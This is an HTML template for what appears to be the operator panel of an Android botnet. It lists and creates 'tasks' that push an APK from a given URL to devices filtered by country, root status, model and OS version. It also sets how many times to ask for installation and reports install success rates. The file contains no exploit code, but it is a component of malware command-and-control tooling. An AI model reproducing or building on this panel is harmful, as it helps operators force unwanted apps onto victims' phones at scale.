<div class="mdl-tabs mdl-js-tabs mdl-js-ripple-effect">
	<div class="mdl-tabs__tab-bar">
		<a href="#task-panel" class="mdl-tabs__tab is-active">Tasks</a>
		<a href="#add-task-panel" class="mdl-tabs__tab">Add Task</a>	
	</div>
	<div class="mdl-tabs__panel is-active" id="task-panel">
		<ul style="padding-left: 0px;">
			<!--<div class="mdl-layout">
				<h4>Active task:</h4>
			</div>
			<table class="demo-charts mdl-js-data-table mdl-data-table--selectable mdl-shadow--2dp">
				<thead>
    				<tr>
	  				<th>Number</th>
         			<th>Package</th>
	  				<th>Url</th>
	  				<th class="mdl-data-table__cell--non-numeric">Country</th>
	  				<th>Limit</th>
	  				<th>Action</th>
    				</tr>
				</thead>
				<tbody>
					%%PLACE_YOU_TABLE_HERE%%
  				</tbody>
			</table>-->

			<div class="mdl-layout">
				<h4>All tasks:</h4>
			</div>
			<table class="demo-charts mdl-js-data-table mdl-shadow--2dp">
				<thead>
				    <tr>
					  <th class="mdl-data-table__cell--non-numeric">Number</th>
				      <th class="mdl-data-table__cell--non-numeric">Package</th>
					  <th class="mdl-data-table__cell--non-numeric">Url</th>
					  <th class="mdl-data-table__cell--non-numeric">Country</th>
					  <th class="mdl-data-table__cell--non-numeric">Limit</th>
					  <th class="mdl-data-table__cell--non-numeric">Complete</th>
					  <th class="mdl-data-table__cell--non-numeric">Action</th>
				    </tr>
				</thead>
				<tbody>

					%%PLACE_YOU_TABLE2_HERE%%

				</tbody>
			</table>
		</ul>
	</div>
	<div class="mdl-tabs__panel" id="add-task-panel" style="font-color: #37474f;">
		<!--<form name="modal_command" method="POST" action="index.php?command=Install%20apk"> -->
			<input type="hidden" name="command" value="install">
			<table style="color: black" class="mdl-data-table mdl-js-data-table  mdl-shadow--2dp">
	  			<thead>
	    		</thead>
			<tbody>
	    		<tr>
	    		<td class="mdl-data-table__cell--non-numeric">
					<input name="task_package" id="task_package" type="text"  id="task_package">
					<label  for="task_package">Package name</label>
		  		</td>
	    		</tr>
		
				<tr>
	      		<td class="mdl-data-table__cell--non-numeric">
					<input name="task_url" id="task_url" type="text" id="task_url">
					<label  for="task_url">URL to apk</label>
		  		</td>
			    </tr>
		
				<tr>
		  		<td class="mdl-data-table__cell--non-numeric">
					<input name="task_country" id="task_country" type="text" pattern="([\w]{2},?)?" id="task_country">
					<label  for="task_country">COUNTRY (XX - country (,) )</label>
		  		</td>
		  		</tr>

				<tr>
		  		<td class="mdl-data-table__cell--non-numeric">
					<input name="task_lim" id="task_lim" type="text" pattern="-?[0-9]*(\.[0-9]+)?" id="task_lim">
					<label  for="task_lim">LIMIT (0-9999)</label>
		  		</td>
				</tr>
		  
				</tr>	

				<tr>
				<td>
					<button style="background-color: black; color: white;" onclick="addTask();" class="mdl-button mdl-js-button mdl-button--raised">
					<i style="" class="material-icons">add_circle</i> Add task</button>
				</td>
				</tr>	
		
	    	</tbody>
		</table>
	<!--</form>-->
</div>
		
		
</div>
</div>
		
<div id="ModalStat" class="modal">
    <div class="modal-header">
       <button onclick="$('#ModalStat').hide();" style="min-width: 30px; height: 30px;width: 30px; left: 95%;" class="mdl-button mdl-js-button mdl-button--fab">
			<i class="material-icons">close</i>
		</button> 
		<h5 id="myModalLabel">Statistic of task: <span id="stat_task_num"> </span></h3>
    </div>
    <div class="modal-body">
		<table class="mdl-data-table mdl-js-data-table mdl-data-table--selectable mdl-shadow--2dp">
			<thead>
   
			</thead>
			<tbody>
				<tr>
			      <td class="mdl-data-table__cell--non-numeric">Wailt for run</td>
			      <td id="stat_task_take" >Loading...</td>
		    	</tr>
	    		<tr>
	    			<td class="mdl-data-table__cell--non-numeric">Installed file</td>
	      			<td id="stat_task_run">Loading...</td>
	    		</tr>
	    		<tr>
	      			<td class="mdl-data-table__cell--non-numeric">Success rate</td>
	      			<td id="stat_task_procent">Loading...</td>
	    		</tr>
			</tbody>
		</table>
	</div>
</div>


<div id="ModalEdit" class="modal">
    <div class="modal-header">
					<button onclick="$('#ModalEdit').hide();" style="min-width: 30px; height: 30px;width: 30px; left: 95%;" class="mdl-button mdl-js-button mdl-button--fab">
					<i class="material-icons">close</i>
					</button> 
	 
        <h3 id="myModalLabel1">Edit task: [number]</h3>
    </div>
    <div class="modal-body">
				
				<div class="">
				<input type="hidden" id="real_task_id">
				<section>
	
					<label  for="task_edit_number">№ of task:</label>
					
					<input class="edit-task" type="text" id="task_edit_number">
					</section>	
					<label for="task_edit_package">Package name:</label>
					<input class="edit-task" type="text" id="task_edit_package"><br>
					
					<label for="task_edit_url">Url:</label>
					<input class="edit-task" type="text" id="task_edit_url">
					
					<label for="task_edit_size">Size in B:</label>
					<input class="edit-task" type="text" id="task_edit_size"><br>
					
					<label for="task_edit_size">Times to ask install:</label>
					<input class="edit-task" type="text" id="task_edit_times">
					
					<label for="task_edit_root">Root:</label>
					<input class="edit-task" type="text" id="task_edit_root">
					
					<label for="task_edit_model">Model:</label>
					<input class="edit-task" type="text" id="task_edit_model">
					
					<label for="task_edit_model">OS ver:</label>
					<input class="edit-task" type="text" id="task_edit_osver">
					
					<label for="task_edit_country">Country:</label>
					<input class="edit-task" type="text" id="task_edit_country">
					
					<label for="task_edit_lim">Limit:</label>
					<input class="edit-task" type="number" id="task_edit_lim">
					
				</div>
    </div>
    <div class="modal-footer">
        <button onclick="edit_task_save();" class="mdl-button mdl-js-button mdl-button--raised">
		<i class="material-icons">save</i>
		</button>
    </div>
</div>